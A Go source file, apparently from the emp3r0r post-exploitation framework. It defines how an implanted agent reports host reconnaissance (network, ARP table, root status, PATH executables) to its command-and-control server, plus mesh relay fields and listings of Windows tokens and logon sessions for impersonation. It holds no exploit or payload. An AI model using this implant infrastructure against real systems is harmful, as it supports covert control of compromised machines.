package def

import (
	"time"
)

// Emp3r0rAgent agent properties
type Emp3r0rAgent struct {
	Tag            string        `cbor:"1,keyasint"`  // operator-facing identifier, derived from the verified UUID
	Name           string        `cbor:"2,keyasint"`  // human-readable name (hostname\username)
	Version        string        `cbor:"3,keyasint"`  // agent version
	Transport      string        `cbor:"4,keyasint"`  // transport the agent uses (HTTP / HTTP2 / QUIC / KCP / CDN / TOR)
	Hostname       string        `cbor:"5,keyasint"`  // Hostname and machine ID
	Hardware       string        `cbor:"6,keyasint"`  // machine details and hypervisor
	Container      string        `cbor:"7,keyasint"`  // container tech (if any)
	Uptime         string        `cbor:"33,keyasint"` // System uptime
	Groups         string        `cbor:"34,keyasint"` // User groups
	CPU            string        `cbor:"8,keyasint"`  // CPU info
	GPU            string        `cbor:"9,keyasint"`  // GPU info
	Mem            string        `cbor:"10,keyasint"` // memory size
	OS             string        `cbor:"11,keyasint"` // OS name and version
	GOOS           string        `cbor:"12,keyasint"` // runtime.GOOS
	Kernel         string        `cbor:"13,keyasint"` // kernel release
	Arch           string        `cbor:"14,keyasint"` // kernel architecture
	From           string        `cbor:"15,keyasint"` // connection source, set by the server
	IPs            []string      `cbor:"16,keyasint"` // IPs that are found on target's NICs
	ARP            []string      `cbor:"17,keyasint"` // ARP table
	User           string        `cbor:"18,keyasint"` // user account info
	HasRoot        bool          `cbor:"19,keyasint"` // is agent run as root?
	HasTor         bool          `cbor:"20,keyasint"` // is agent from Tor?
	HasInternet    bool          `cbor:"21,keyasint"` // has internet access?
	NCSIEnabled    bool          `cbor:"22,keyasint"` // NCSI (or similar services) enabled
	Process        *AgentProcess `cbor:"23,keyasint"` // agent's process
	Exes           []string      `cbor:"24,keyasint"` // executables found in agent's $PATH
	CWD            string        `cbor:"25,keyasint"` // current working directory
	Product        any           `cbor:"26,keyasint"` // product info
	UUID           string        `cbor:"27,keyasint"` // from the authenticated MsgAuth
	UUIDSig        string        `cbor:"28,keyasint"` // from MsgAuth.IdentityToken
	PublicKey      string        `cbor:"29,keyasint"` // agent's public key (PEM encoded) for TOFU
	C2Host         string        `cbor:"30,keyasint"` // local display only; not part of check-in
	LastSeen       time.Time     `cbor:"31,keyasint"` // server-side liveness state
	LastSeenRTT    time.Duration `cbor:"32,keyasint"` // server-side liveness state
	AgentToken     *AgentToken   `cbor:"36,keyasint"` // pushed separately in session_info
	MeshRoute      string        `cbor:"37,keyasint"` // p2p routing role or gateway used by this agent
	P2PRelayPort   string        `cbor:"38,keyasint"` // dynamic P2P relay port assigned to this agent
	MeshGossipPort string        `cbor:"39,keyasint"` // dynamic mesh gossip port assigned to this agent
	Files          []string      `cbor:"40,keyasint"` // list of available files/modules in agent storage/MemFS
	GOArch         string        `cbor:"41,keyasint"` // runtime.GOARCH of the agent binary (not the OS kernel arch)
	P2PTransport   string        `cbor:"42,keyasint"` // transport the agent's P2P relay listens on (kcp/mtls/smb)
	Owner          string        `cbor:"43,keyasint"` // server-side operator lock
	OfflineGrace   int           `cbor:"44,keyasint"` // agent-chosen removal grace in seconds; 0 means remove immediately
}

// EnrichedPeer holds detailed peer information pushed by C2.
type EnrichedPeer struct {
	UUID           string   `cbor:"1,keyasint"`
	IPs            []string `cbor:"2,keyasint"`
	From           string   `cbor:"3,keyasint"`
	P2PRelayPort   string   `cbor:"4,keyasint"`
	MeshGossipPort string   `cbor:"5,keyasint"`
	Files          []string `cbor:"6,keyasint"`
	LastSeen       int64    `cbor:"7,keyasint"`
	P2PTransport   string   `cbor:"8,keyasint"` // transport the peer's relay listens on
}

// EnrichedPeerList is the C2-provided list of active peers. The payload is
// authenticated by the PFS-encrypted tunnel, so it does not carry a separate
// CA signature.
type EnrichedPeerList struct {
	Peers []EnrichedPeer `cbor:"1,keyasint"`
}

// AgentProcess process info of our agent
type AgentProcess struct {
	PID     int    `cbor:"1,keyasint"` // pid
	PPID    int    `cbor:"2,keyasint"` // parent PID
	Cmdline string `cbor:"3,keyasint"` // process name and command line args
	Parent  string `cbor:"4,keyasint"` // parent process name and cmd line args
}

// MsgTunData data to send in the tunnel, between C&C and agent
// this can also be used for operator to CC communication
type MsgTunData struct {
	JobID            string            `cbor:"1,keyasint"`  // job ID, to retrieve the response, or empty if not a command
	CmdSlice         []string          `cbor:"2,keyasint"`  // command args, [0] is the command, or empty if not a command
	Response         []byte            `cbor:"3,keyasint"`  // response from the agent, or message to operator
	Tag              string            `cbor:"4,keyasint"`  // agent tag for agent->C2, or message type if sent to operator
	Time             int64             `cbor:"5,keyasint"`  // Unix milliseconds, used for RTT
	EphemPublicKey   []byte            `cbor:"8,keyasint"`  // ephemeral public key for ECDH key exchange
	EnrichedPeerList *EnrichedPeerList `cbor:"10,keyasint"` // C2-provided peer list
	AgentToken       *AgentToken       `cbor:"11,keyasint"` // mesh router authorization token
}

// TokenEntry is one entry of a !list_tokens response, marshaled as CBOR by
// the agent and decoded by the CC (completion + console rendering).
type TokenEntry struct {
	Key          string `cbor:"1,keyasint"` // SID, or netlogon session name when IsSession
	FriendlyName string `cbor:"2,keyasint"` // human-readable identity of the token
	IsSession    bool   `cbor:"3,keyasint"` // true when Key is a netlogon logon session
}

// SessionEntry is one entry of a !list_sessions response, marshaled as CBOR
// by the agent and decoded by the CC (completion + console rendering).
type SessionEntry struct {
	Name      string `cbor:"1,keyasint"` // session reference name (usable via the token option)
	User      string `cbor:"2,keyasint"` // account name
	Domain    string `cbor:"3,keyasint"` // domain ("." for local accounts)
	LogonID   uint64 `cbor:"4,keyasint"` // logon session AuthenticationId (LUID)
	CreatedAt string `cbor:"5,keyasint"` // RFC3339 timestamp
}

// CheckinFields returns the agent-owned subset sent in the check-in body.
// Identity, tag, connection source, liveness, token and operator state are
// derived by the server and deliberately absent from this map.
func (a *Emp3r0rAgent) CheckinFields() map[uint64]any {
	if a == nil {
		return nil
	}
	fields := make(map[uint64]any, 24)
	putStr := func(key uint64, value string) {
		if value != "" {
			fields[key] = value
		}
	}
	putStr(2, a.Name)
	putStr(3, a.Version)
	putStr(4, a.Transport)
	putStr(5, a.Hostname)
	putStr(6, a.Hardware)
	putStr(7, a.Container)
	putStr(8, a.CPU)
	putStr(9, a.GPU)
	putStr(10, a.Mem)
	putStr(11, a.OS)
	putStr(12, a.GOOS)
	putStr(13, a.Kernel)
	putStr(14, a.Arch)
	if len(a.IPs) > 0 {
		fields[16] = a.IPs
	}
	if len(a.ARP) > 0 {
		fields[17] = a.ARP
	}
	putStr(18, a.User)
	fields[19] = a.HasRoot
	fields[20] = a.HasTor
	fields[21] = a.HasInternet
	fields[22] = a.NCSIEnabled
	if a.Process != nil {
		fields[23] = a.Process
	}
	if len(a.Exes) > 0 {
		fields[24] = a.Exes
	}
	putStr(25, a.CWD)
	if a.Product != nil {
		fields[26] = a.Product
	}
	putStr(29, a.PublicKey)
	putStr(33, a.Uptime)
	putStr(34, a.Groups)
	putStr(37, a.MeshRoute)
	putStr(38, a.P2PRelayPort)
	putStr(39, a.MeshGossipPort)
	if len(a.Files) > 0 {
		fields[40] = a.Files
	}
	putStr(41, a.GOArch)
	putStr(42, a.P2PTransport)
	if a.OfflineGrace != 0 {
		fields[44] = a.OfflineGrace
	}
	return fields
}
